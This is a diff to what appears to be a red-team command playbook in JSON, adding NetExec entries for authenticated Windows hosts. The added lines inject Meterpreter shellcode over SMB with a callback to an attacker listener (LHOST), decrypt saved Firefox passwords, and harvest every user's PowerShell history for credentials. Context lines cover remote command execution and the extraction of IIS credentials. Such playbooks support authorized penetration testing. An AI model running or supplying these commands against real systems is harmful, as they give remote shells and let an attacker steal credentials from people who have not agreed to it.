@@ -1316,6 +1316,11 @@
         },
         {
           "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M met_inject -o LHOST={{lhost}} LPORT=4444",
+          "note": "Inject Meterpreter shellcode straight into memory over SMB (needs admin) — a staged foothold when you want a full MSF session rather than a one-shot command. Start the matching multi/handler first."
+        },
+        {
+          "tool": "nxc",
           "run": "nxc winrm {{target}} -u {{user}} -p '{{password}}' -X '{{command}}'",
           "note": "The WinRM version, zero SMB service artifacts, output over 5985. CAVEAT: on some nxc builds `nxc winrm -x/-X` crashes with `zip() argument 2 is longer than argument 1` (seen in testing) and returns nothing; if that happens, use `nxc smb -x` (wmiexec, above), impacket-wmiexec, or evil-winrm for command exec, they were reliable on the same box."
         },
@@ -1410,6 +1415,16 @@
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M iis",
           "note": "IIS application-pool and web.config credentials (service accounts, DB connection strings) from the box."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M firefox",
+          "note": "Decrypt saved Firefox logins (logins.json + key4.db) from user profiles on the host."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M powershell_history",
+          "note": "Read every user's ConsoleHost_history.txt — operators routinely paste passwords/connection strings into PowerShell one-liners."
         },
         {
           "tool": "nxc",
